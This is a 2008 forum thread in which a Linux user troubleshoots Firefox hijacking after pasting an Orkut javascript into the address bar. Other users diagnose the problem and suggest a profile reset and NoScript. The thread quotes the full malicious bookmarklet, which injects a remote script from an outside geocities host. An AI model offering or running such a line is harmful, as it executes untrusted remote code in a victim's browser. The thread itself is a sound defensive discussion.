---
title: "firefox attacked."
date: 2008-08-25
forum: Security
---

### Post by pravin03 on 2008-08-25
Everything was fine till today evening. suddenly mozilla started automatically searching for / in google. there is no result for your search / came.then search started automatically. @4 times a second. i closed firefox. when i started firefox again, the russian blog which i added to feed toolbar started to load automatically.in new new windows.panel got full of firefox windows.firefox launcher was automatically removed from avant,desktop greyed,system got struck. I switched the power off. on restart,all my settings and bookmarks(worth days of googling) were lost. i was unable to set my home page, every time when i start firefox asked whether to start from previous section or start a new section,even if i left nothing unclosed in the previous section.

I removed firefox completely.

root@praveen-desktop:~# rkhunter --check --rwo
Warning: Suspicious file types found in /dev:
/dev/shm/pulse-shm-225214033: data
Warning: Hidden directory found: /etc/.java
Warning: Hidden directory found: /dev/.static
Warning: Hidden directory found: /dev/.udev
Warning: Hidden directory found: /dev/.initramfs




And these errors are there in error console.

Failed to load XPCOM component: /usr/lib/xulrunner-1.9.0.1/components/libpyloader.so

Failed to load XPCOM component: /usr/lib/xulrunner-1.9.0.1/components/pyabout.py

Error: [Exception... "Component returned failure code: 0x80570016 (NS_ERROR_XPC_GS_RETURNED_FAILURE) [nsIJSCID.getService]" nsresult: "0x80570016 (NS_ERROR_XPC_GS_RETURNED_FAILURE)" location: "JS frame :: file:///usr/lib/firefox-3.0.1/components/nsBrowserGlue.js :: bg__initPlaces :: line 386" data: no]
Source File: file:///usr/lib/firefox-3.0.1/components/nsBrowserGlue.js
Line: 386

Error: uncaught exception: [Exception... "Component returned failure code: 0x80570016 (NS_ERROR_XPC_GS_RETURNED_FAILURE) [nsIJSCID.getService]" nsresult: "0x80570016 (NS_ERROR_XPC_GS_RETURNED_FAILURE)" location: "JS frame :: chrome://wizzrss/content/utils.js :: init :: line 439" data: no]


Error: uncaught exception: [Exception... "Component returned failure code: 0x8007000e (NS_ERROR_OUT_OF_MEMORY) [nsIDocShellHistory.useGlobalHistory]" nsresult: "0x8007000e (NS_ERROR_OUT_OF_MEMORY)" location: "JS frame :: chrome://browser/content/browser.js :: prepareForStartup :: line 763" data: no] 



I added this blog to my feeds.
[http://www.transparent.com/TLBlog/Russian/2008/08/pictures-of-the-war-from-engli.html](http://www.transparent.com/TLBlog/Russian/2008/08/pictures-of-the-war-from-engli.html)



Some days ago I pasted a javascript on my browsers address bar.It was from orkut.I flagged it that day itself.Now i cant find it there.

---

### Post by rogeriopvl on 2008-08-25
I've quickly checked the URL you pasted, and although it's a weird way of coding javascript, it seems harmless, but I'm not sure because I haven't analysed it deeply.

Now the javascript you pasted on the URL bar from orkut.. it's probably the problem...

---

### Post by pravin03 on 2008-08-25
can i revert changes made by that javascript?

---

### Post by rogeriopvl on 2008-08-25
> **pravin03 said:**
> can i revert changes made by that javascript?

it depends on what changes have been made. But unless you know what really happened, you can't have sure of what changes have occurred.

I wouldn't trust on that system anymore. I advise you to format and reinstall... and install the noscript addon for Firefox (blocks unauthorized javascript).

---

### Post by pravin03 on 2008-08-25
This is that javascript.
javascript:d=document;c=d.createElement('script');d.body.appendChild(c);c.src='http://www.geocities.com/money_2590_thakur/photos.js';void(0)

---

### Post by rogeriopvl on 2008-08-26
> **pravin03 said:**
> This is that javascript.
javascript:d=document;c=d.createElement('script');d.body.appendChild(c);c.src='http://www.geocities.com/money_2590_thakur/photos.js';void(0)

Well, that code calls for an external javascript file, which has been taken offline... so it was probably malicious... and the source of your problem.

---

### Post by oscarsfriend on 2008-08-26
The warnings from rkhunter are no problem.  See [this page]("https://bugs.launchpad.net/ubuntu/+source/rkhunter/+bug/86153") and [this page]("http://ubuntuforums.org/showthread.php?p=4908163") for more info.

I'm not sure about the other warnings, though I think it unlikely a malicious js script could get root access and alter system files.  It's more likely it just screwed with files in your firefox profile.  Just removing your profile and setting up a new one should fix you up (but reinstalling firefox without removing your profile will just give you the same problem).

Also, you might want to install the [NoScript]("https://addons.mozilla.org/en-US/firefox/addon/722") firefox add-on mentioned above.

---

### Post by SpaceMaster on 2008-08-26
> **oscarsfriend said:**
> The warnings from rkhunter are no problem.  See [this page]("https://bugs.launchpad.net/ubuntu/+source/rkhunter/+bug/86153") and [this page]("http://ubuntuforums.org/showthread.php?p=4908163") for more info.

I'm not sure about the other warnings, though I think it unlikely a malicious js script could get root access and alter system files.  It's more likely it just screwed with files in your firefox profile.  Just removing your profile and setting up a new one should fix you up.

Also, you might want to install the [NoScript]("https://addons.mozilla.org/en-US/firefox/addon/722") firefox add-on.

You're right.  Nothing - JavaScript, Flash, and your mom's pet ferret cannot get root access.  That is unless you give them your password, consciously relinquishing control of your system.

This does seem reminiscent of [recent attacks via Flash]("http://blogs.zdnet.com/security/?p=1189").

---

### Post by oscarsfriend on 2008-08-26
I am of course assuming that the OP installed Firefox via the repos, or a legitimate Firefox download site.  

If you google for "firefox" it is easy to stumble across fake Firefox/Mozilla websites with their own (possibly malware infected) versions of Firefox to download.  For example, googling right now (with various ad-blocking add-ons turned off), shows a Google ad(!) for Firefox 3, that links through to a fake Mozilla website (not only is the address not legit, but look at the url then hover over it and look again in the status bar "III" = "ili").  The page itself looks pretty close to Mozilla's, though it only has a download for Windows.  And it's made all the worse by appearing to be endorsed by Google!  I also gather that scammers occasionally Googlebomb, so that the top search for Firefox links through to a fake Mozilla website.  (More info [here]("http://forums.mozillazine.org/viewtopic.php?f=38&t=630317&sid=27d27997572eaef83365c5d391044cb8") and [here]("http://support.mozilla.com/tiki-view_forum_thread.php?locale=lt&comments_parentId=105743&forumId=1").)

---

### Post by pravin03 on 2008-08-26
I removed files, .mozilla from home,
then warnings,root@praveen-desktop:~# rkhunter --check --rwo
Warning: Suspicious file types found in /dev:
/dev/shm/pulse-shm-225214033: data
Warning: Hidden directory found: /etc/.java
Warning: Hidden directory found: /dev/.static
Warning: Hidden directory found: /dev/.initramfs
were removed.
then
sudo apt-get remove --purge firefox

restarted
sudo apt-get install firefox.

NOW EVERYTHING IS OK.

I got my firefox back.

---

### Post by oscarsfriend on 2008-08-26
I'm not sure you should have removed the files rkhunter misreported as suspicious, as this might lead to problems with your system.  I suspect those in /dev/ will be rebuilt the next time you reboot anyway.

---

### Post by DSL5 on 2008-08-29
thank you so much Pravin03! I had the same problem today, followed ur post, and my firefox works again!

---

